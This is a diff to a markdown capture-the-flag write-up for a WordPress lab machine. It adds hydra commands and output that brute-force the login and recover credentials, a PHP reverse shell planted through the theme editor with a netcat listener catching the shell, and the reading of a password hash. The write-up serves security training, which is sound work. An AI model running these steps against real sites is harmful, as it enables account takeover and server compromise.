@@ -105,6 +105,8 @@ log=user&pwd=pass&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.237.121%2Fwp-a
 ```
 
 # Exploitation
+
+## Cracking Passwords in WordPress
 built this command with hydra and found a username
 ```sh
 $ hydra -L fsocity.dic -p pass http-post-form://10.10.237.121"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.237.121%2Fwp-admin%2F&testcookie=1:F=Invalid username" -I
@@ -116,7 +118,7 @@ $ hydra -L fsocity.dic -p pass http-post-form://10.10.237.121"/wp-login.php:log=
 ```
 now lets try to find the password
 
-_..brute forcing took a bit too long and I realized that I have to remove the duplicates from the wordlist.._
+_..brute forcing the password took a bit too long and I realized that I have to remove the duplicates from the wordlist.._
 ```sh
 sort fsocity.dic | uniq > fsocity.dic.uniq
 ```
@@ -125,3 +127,48 @@ the size difference is quiet noticeable
 -rw-r--r-- 1 janosch wheel 7245381 fsocity.dic
 -rw-r--r-- 1 janosch wheel   96747 fsocity.dic.uniq
 ```
+
+```zsh
+$ hydra -l elliot -P fsocity.dic.uniq http-post-form://10.10.154.137"/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -I
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-05 15:14:16
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
+[DATA] attacking http-post-form://10.10.154.137:80/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username
+[STATUS] 2036.00 tries/min, 2036 tries in 00:01h, 9416 to do in 00:05h, 16 active
+[80][http-post-form] host: 10.10.154.137   login: elliot   password: ER28-0652
+```
+
+## RCE exploit via Theme
+found this [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) and used the Editor to replace the 404 Template with the exploit
+
+```sh
+$ nc -lvnp 1234                                                                                  ✘ 1
+Connection from 10.10.52.84:37095
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 15:47:40 up 13 min,  0 users,  load average: 0.00, 0.01, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+We Got A shell  ^-^
+# Privilege Escalation
+now that we've gotten a shell we should have a look at the home folder
+
+```sh
+$ cd /home 
+$ ls
+robot
+$ cd robot 
+$ ls
+key-2-of-3.txt
+password.raw-md5
+$ cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+so we cant access the second key because we don't have privilege but the password hash seems to be in the other file so we just need to crack it
+
